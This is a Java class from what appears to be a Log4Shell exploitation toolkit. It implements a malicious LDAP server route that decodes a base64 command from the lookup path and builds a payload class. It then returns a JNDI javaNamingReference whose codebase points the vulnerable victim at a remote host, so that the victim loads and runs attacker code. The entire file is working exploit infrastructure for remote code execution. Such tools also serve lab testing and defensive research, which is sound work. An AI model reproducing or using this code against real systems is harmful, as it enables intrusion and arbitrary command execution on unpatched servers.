package es.malvarez.log4shell.malicious.ldap;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import es.malvarez.log4shell.malicious.MaliciousProperties;
import es.malvarez.log4shell.malicious.payload.Payload;
import es.malvarez.log4shell.malicious.payload.PayloadGenerator;
import es.malvarez.log4shell.malicious.payload.PayloadType;
import es.malvarez.log4shell.malicious.util.Base64Utils;
import lombok.RequiredArgsConstructor;
import lombok.extern.log4j.Log4j2;

@Log4j2
@RequiredArgsConstructor
@LdapRoute(route = "command")
public class LdapCommandController implements LdapController {

    private final PayloadGenerator payloadGenerator;

    private final MaliciousProperties properties;

    @Override
    public void process(final InMemoryInterceptedSearchResult result, final String base) throws Exception {
        PayloadType type = getPayloadFromBase(base);
        String command = getCmdFromBase(base);
        Payload payload = payloadGenerator.getPayload(type, command);
        log.info("LDAP result for {} redirect to {}",
                base,
                properties.getCodeBase() + payload.getClassName() + ".class");
        Entry entry = new Entry(base);
        entry.addAttribute("javaClassName", type.name());
        entry.addAttribute("javaCodeBase", properties.getCodeBase().toString());
        entry.addAttribute("objectClass", "javaNamingReference");
        entry.addAttribute("javaFactory", payload.getClassName());
        result.sendSearchEntry(entry);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    public static PayloadType getPayloadFromBase(final String base) {
        int firstIndex = base.indexOf("/");
        int lastIndex = base.lastIndexOf("/");
        String payload = base.substring(firstIndex + 1, lastIndex);
        return PayloadType.fromName(payload);
    }

    public static String getCmdFromBase(final String base) {
        int firstIndex = base.lastIndexOf("/");
        String cmd = base.substring(firstIndex + 1);
        return Base64Utils.fromBase64(cmd);
    }
}
